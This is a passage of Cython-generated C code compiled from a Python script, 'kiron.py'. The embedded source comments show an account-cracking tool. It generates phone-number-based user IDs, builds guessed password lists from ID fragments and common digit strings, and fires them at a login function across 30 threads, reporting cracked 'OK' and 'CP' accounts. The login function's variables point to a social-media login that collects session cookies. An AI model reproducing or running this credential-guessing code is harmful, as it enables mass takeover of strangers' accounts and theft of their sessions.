 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')
 *             linex()
 *             for love in user:             # <<<<<<<<<<<<<<
 *                 uid = code + love
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
 */
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_user); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 391, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
            __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1);
            __pyx_t_5 = 0;
            __pyx_t_7 = NULL;
          } else {
            __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 391, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_7 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 391, __pyx_L10_error)
          }
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          for (;;) {
            if (likely(!__pyx_t_7)) {
              if (likely(PyList_CheckExact(__pyx_t_1))) {
                {
                  Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
                  #if !CYTHON_ASSUME_SAFE_MACROS
                  if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 391, __pyx_L10_error)
                  #endif
                  if (__pyx_t_5 >= __pyx_temp) break;
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_2); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 391, __pyx_L10_error)
                #else
                __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 391, __pyx_L10_error)
                __Pyx_GOTREF(__pyx_t_2);
                #endif
              } else {
                {
                  Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
                  #if !CYTHON_ASSUME_SAFE_MACROS
                  if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 391, __pyx_L10_error)
                  #endif
                  if (__pyx_t_5 >= __pyx_temp) break;
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_2); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 391, __pyx_L10_error)
                #else
                __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 391, __pyx_L10_error)
                __Pyx_GOTREF(__pyx_t_2);
                #endif
              }
            } else {
              __pyx_t_2 = __pyx_t_7(__pyx_t_1);
              if (unlikely(!__pyx_t_2)) {
                PyObject* exc_type = PyErr_Occurred();
                if (exc_type) {
                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                  else __PYX_ERR(0, 391, __pyx_L10_error)
                }
                break;
              }
              __Pyx_GOTREF(__pyx_t_2);
            }
            __Pyx_XDECREF_SET(__pyx_v_love, __pyx_t_2);
            __pyx_t_2 = 0;

            /* "kiron.py":392
 *             linex()
 *             for love in user:
 *                 uid = code + love             # <<<<<<<<<<<<<<
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)
 */
            __pyx_t_2 = PyNumber_Add(__pyx_v_code, __pyx_v_love); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 392, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_2);
            __pyx_t_2 = 0;

            /* "kiron.py":393
 *             for love in user:
 *                 uid = code + love
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']             # <<<<<<<<<<<<<<
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)
 *         print(f'')
 */
            __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_v_uid, 0, 8, NULL, NULL, &__pyx_slice__65, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 393, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_3 = __Pyx_PyObject_GetSlice(__pyx_v_uid, 0, 7, NULL, NULL, &__pyx_slice__66, 0, 1, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 393, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_10 = __Pyx_PyObject_GetSlice(__pyx_v_uid, 0, 6, NULL, NULL, &__pyx_slice__67, 0, 1, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 393, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_14 = PyList_New(8); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 393, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_INCREF(__pyx_v_uid);
            __Pyx_GIVEREF(__pyx_v_uid);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 0, __pyx_v_uid)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_INCREF(__pyx_v_love);
            __Pyx_GIVEREF(__pyx_v_love);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 1, __pyx_v_love)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_GIVEREF(__pyx_t_2);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 2, __pyx_t_2)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_GIVEREF(__pyx_t_3);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 3, __pyx_t_3)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_GIVEREF(__pyx_t_10);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 4, __pyx_t_10)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_INCREF(__pyx_kp_s_708090);
            __Pyx_GIVEREF(__pyx_kp_s_708090);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 5, __pyx_kp_s_708090)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_INCREF(__pyx_kp_s_203040);
            __Pyx_GIVEREF(__pyx_kp_s_203040);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 6, __pyx_kp_s_203040)) __PYX_ERR(0, 393, __pyx_L10_error);
            __Pyx_INCREF(__pyx_kp_s_102030);
            __Pyx_GIVEREF(__pyx_kp_s_102030);
            if (__Pyx_PyList_SET_ITEM(__pyx_t_14, 7, __pyx_kp_s_102030)) __PYX_ERR(0, 393, __pyx_L10_error);
            __pyx_t_2 = 0;
            __pyx_t_3 = 0;
            __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_passlist, ((PyObject*)__pyx_t_14));
            __pyx_t_14 = 0;

            /* "kiron.py":394
 *                 uid = code + love
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)             # <<<<<<<<<<<<<<
 *         print(f'')
 *         linex()
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 394, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_idpaslogin); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 394, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_2 = NULL;
            __pyx_t_4 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
                __pyx_t_4 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[5] = {__pyx_t_2, __pyx_t_3, __pyx_v_uid, __pyx_v_passlist, __pyx_v_tl};
              __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+1-__pyx_t_4, 4+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 394, __pyx_L10_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            }
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            /* "kiron.py":391
 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')
 *             linex()
 *             for love in user:             # <<<<<<<<<<<<<<
 *                 uid = code + love
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
 */
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "kiron.py":384
 *             EX = "".join(random.choice(string.digits) for _ in range(6))
 *             user.append(EX)
 *         with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *             tl = str(len(user))
 *             clear()
 */
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L15_try_end;
        __pyx_L10_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("kiron.BD", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_14, &__pyx_t_10) < 0) __PYX_ERR(0, 384, __pyx_L12_except_error)
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_10);
          __pyx_t_3 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_14, __pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 384, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_3, NULL);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 384, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (__pyx_t_16 < 0) __PYX_ERR(0, 384, __pyx_L12_except_error)
          __pyx_t_17 = (!__pyx_t_16);
          if (unlikely(__pyx_t_17)) {
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_10);
            __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_14, __pyx_t_10);
            __pyx_t_1 = 0; __pyx_t_14 = 0; __pyx_t_10 = 0; 
            __PYX_ERR(0, 384, __pyx_L12_except_error)
          }
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          goto __pyx_L11_exception_handled;
        }
        __pyx_L12_except_error:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L1_error;
        __pyx_L11_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L15_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_9) {
          __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__27, NULL);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 384, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        goto __pyx_L9;
      }
      __pyx_L9:;
    }
    goto __pyx_L22;
    __pyx_L6_error:;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    goto __pyx_L1_error;
    __pyx_L22:;
  }

  /* "kiron.py":395
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)
 *         print(f'')             # <<<<<<<<<<<<<<
 *         linex()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')
 */
  __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__68, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

  /* "kiron.py":396
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)
 *         print(f'')
 *         linex()             # <<<<<<<<<<<<<<
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m TOTAL \x1b[38;5;46mOK \033[1;37m :  \x1b[38;5;46m' +str(len(oks)))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_linex); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_14);
  __pyx_t_1 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_14))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_14);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_14, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_1, NULL};
    __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 396, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
  }
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

  /* "kiron.py":397
 *         print(f'')
 *         linex()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')             # <<<<<<<<<<<<<<
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m TOTAL \x1b[38;5;46mOK \033[1;37m :  \x1b[38;5;46m' +str(len(oks)))
 *         linex()
 */
  __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 397, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

  /* "kiron.py":398
 *         linex()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m TOTAL \x1b[38;5;46mOK \033[1;37m :  \x1b[38;5;46m' +str(len(oks)))             # <<<<<<<<<<<<<<
 *         linex()
 * #[ RAND MTD NO.1 ]#
 */
  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_oks); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __pyx_t_5 = PyObject_Length(__pyx_t_10); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 398, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_t_10 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __pyx_t_14 = __Pyx_PyObject_Str(__pyx_t_10); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_14);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_t_10 = PyNumber_Add(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_18, __pyx_t_14); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
  __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_14);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

  /* "kiron.py":399
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m TOTAL \x1b[38;5;46mOK \033[1;37m :  \x1b[38;5;46m' +str(len(oks)))
 *         linex()             # <<<<<<<<<<<<<<
 * #[ RAND MTD NO.1 ]#
 * def idpaslogin(uid,passlist,tl):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_linex); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 399, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __pyx_t_1 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_10))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_10);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_10, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_1, NULL};
    __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 399, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_14);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  }
  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

  /* "kiron.py":372
 *         menu()
 * #[ BANGLADESH ]#
 * def BD():             # <<<<<<<<<<<<<<
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("kiron.BD", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_code);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_n);
  __Pyx_XDECREF(__pyx_v_EX);
  __Pyx_XDECREF(__pyx_v_crack_submit);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_love);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_passlist);
  __Pyx_XDECREF(__pyx_gb_5kiron_2BD_2generator);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":401
 *         linex()
 * #[ RAND MTD NO.1 ]#
 * def idpaslogin(uid,passlist,tl):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_27idpaslogin(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_27idpaslogin = {"idpaslogin", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_5kiron_27idpaslogin, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5kiron_27idpaslogin(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_uid = 0;
  PyObject *__pyx_v_passlist = 0;
  CYTHON_UNUSED PyObject *__pyx_v_tl = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED Py_ssize_t __pyx_nargs;
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject* values[3] = {0,0,0};
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("idpaslogin (wrapper)", 0);
  #if !CYTHON_METH_FASTCALL
  #if CYTHON_ASSUME_SAFE_MACROS
  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #else
  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;
  #endif
  #endif
  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_uid,&__pyx_n_s_passlist,&__pyx_n_s_tl,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  3: values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_uid)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[0]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 401, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[1]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 401, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("idpaslogin", 1, 3, 3, 1); __PYX_ERR(0, 401, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_tl)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[2]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 401, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("idpaslogin", 1, 3, 3, 2); __PYX_ERR(0, 401, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "idpaslogin") < 0)) __PYX_ERR(0, 401, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 3)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
      values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
    }
    __pyx_v_uid = values[0];
    __pyx_v_passlist = values[1];
    __pyx_v_tl = values[2];
  }
  goto __pyx_L6_skip;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("idpaslogin", 1, 3, 3, __pyx_nargs); __PYX_ERR(0, 401, __pyx_L3_error)
  __pyx_L6_skip:;
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L3_error:;
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_AddTraceback("kiron.idpaslogin", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5kiron_26idpaslogin(__pyx_self, __pyx_v_uid, __pyx_v_passlist, __pyx_v_tl);

  /* function exit code */
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_26idpaslogin(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_passlist, CYTHON_UNUSED PyObject *__pyx_v_tl) {
  PyObject *__pyx_v_ps = NULL;
  PyObject *__pyx_v_session = NULL;
  PyObject *__pyx_v_free_fb = NULL;
  PyObject *__pyx_v_us = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_head = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_po = NULL;
  PyObject *__pyx_v_log_cookies = NULL;
  PyObject *__pyx_v_coki = NULL;
  PyObject *__pyx_v_ssbb = NULL;
